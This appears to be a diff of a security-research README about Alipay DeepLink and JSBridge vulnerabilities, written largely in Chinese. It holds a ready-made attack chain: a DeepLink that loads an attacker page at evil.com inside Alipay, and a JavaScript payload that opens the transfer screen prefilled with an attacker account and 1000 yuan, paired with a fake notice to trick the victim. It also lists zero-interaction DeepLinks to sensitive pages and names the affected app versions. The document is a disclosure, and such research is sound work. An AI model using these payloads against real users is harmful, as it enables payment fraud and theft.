@@ -1,5 +1,50 @@
-# Alipay DeepLink + JSBridge Security Research
 
+
+## Attack Chain A: JSBridge Exploitation（JSBridge 利用攻击链）
+**DeepLink URL:**
+```
+alipays://platformapi/startapp?appId=20000067&url=https://evil.com/poc.html
+```
+
+**攻击流程:**
+1. 受害者点击恶意链接
+2. 支付宝 WebView 加载外部页面 (https://evil.com/poc.html)
+3. 自动注入 AlipayJSBridge 接口
+4. 执行 JavaScript Payload:
+```javascript
+AlipayJSBridge.call('startApp', {
+  appId: '20000116',
+  params: {
+    uid: 'attacker@evil.com',
+    amount: '1000',
+    memo: '安全验证'
+  }
+});
+```
+5. 打开转账页面，预填攻击者账号和 1000 元金额
+6. 显示假转账通知诱导用户确认
+
+## Attack Chain B: Zero-Interaction DeepLinks（零交互 DeepLink 攻击链）
+
+可直接唤起敏感页面的 DeepLink 列表：
+
+| 功能 | appId | DeepLink |
+|------|-------|----------|
+| **交易记录** | 20000003 | `alipays://platformapi/startapp?appId=20000003` |
+| **转账联系人** | 20000116 | `alipays://platformapi/startapp?appId=20000116` |
+| **收款码** | 20000123 | `alipays://platformapi/startapp?appId=20000123` |
+| **余额宝余额** | 20000032 | `alipays://platformapi/startapp?appId=20000032` |
+| **安全设置** | 20000052 | `alipays://platformapi/startapp?appId=20000052` |
+| **银行卡管理** | 20000193 | `alipays://platformapi/startapp?appId=20000193` |
+
+## 受影响版本
+- Android: com.eg.android.AlipayGphone v10.8.26.7000 / v10.8.30.8000
+- iOS: 26.3.1
+
+## 核心风险点
+1. **alipays:// scheme** 可被任意应用或网页调用
+2. **JSBridge API** 未做来源验证，允许危险操作（启动应用、获取设备信息、UI 欺骗）
+3. **零交互攻击** 无需用户额外权限即可访问敏感功能
 **17 Verified Vulnerabilities | 3 Devices | 308 Server Log Entries**
 
 ## Full Report
